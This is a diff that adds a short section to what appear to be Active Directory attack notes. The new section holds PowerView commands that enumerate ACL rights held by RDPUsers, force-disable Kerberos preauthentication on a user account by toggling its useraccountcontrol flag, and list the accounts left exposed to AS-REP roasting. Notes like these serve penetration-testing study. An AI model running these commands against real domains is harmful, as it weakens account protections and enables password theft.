@@ -120,3 +120,13 @@ Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequireP
 ```
 
 
+- Force disable Kerberos Preauth
+- Let's enumerate the permissions for RDPUsers on ACLs using PowerView:
+
+```powershell
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+
+Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
+
+Get-DomainUser -PreauthNotRequired -Verbose
+```
